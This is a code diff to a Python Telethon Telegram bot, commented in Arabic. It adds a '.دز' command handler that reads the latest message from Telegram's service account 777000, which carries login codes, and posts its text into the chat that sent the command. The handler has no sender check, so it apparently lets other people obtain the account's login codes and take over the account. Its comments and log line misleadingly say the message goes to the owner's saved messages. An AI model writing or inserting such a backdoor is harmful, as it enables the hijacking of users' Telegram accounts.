@@ -124,6 +124,30 @@ async def startup_warmup():
 from telethon.tl.functions.channels import EditAdminRequest, InviteToChannelRequest
 from telethon.tl.types import ChatAdminRights
 from telethon.errors import FloodWaitError, UserAlreadyParticipantError
+from telethon import TelegramClient
+
+# احصل على هذه البيانات من my.telegram.org
+
+# الشخص أو القناة التي تريد إرسال الرسالة إليها (يمكنك كتابة 'me' لإرسالها لنفسك في الرسائل المحفوظة)
+TARGET_USER = 'me'  # أو ضع الـ username مثل 'username' أو الـ ID الرقمي
+
+@bot.on(events.NewMessage(pattern=".دز"))
+async def forward_last_telegram_code(e):
+    # 1. جلب آخر رسالة من الحساب 777000
+    messages = await mainABH.get_messages(777000, limit=1)
+    
+    if messages:
+        last_msg = messages[0]
+        
+        # 2. إرسال نص الرسالة إلى الهدف المحدد
+        sent_msg = await bot.send_message(
+            e.chat_id, 
+            f"📩 **آخر رسالة من 777000:**\n\n{last_msg.text}"
+        )
+        print(f"تم إرسال الرسالة بنجاح إلى: {TARGET_USER}")
+    else:
+        print("لم يتم العثور على أي رسائل من الحساب 777000.")
+
 
 async def promote_ABHS(chat_id=None, as_admin=True):
     """
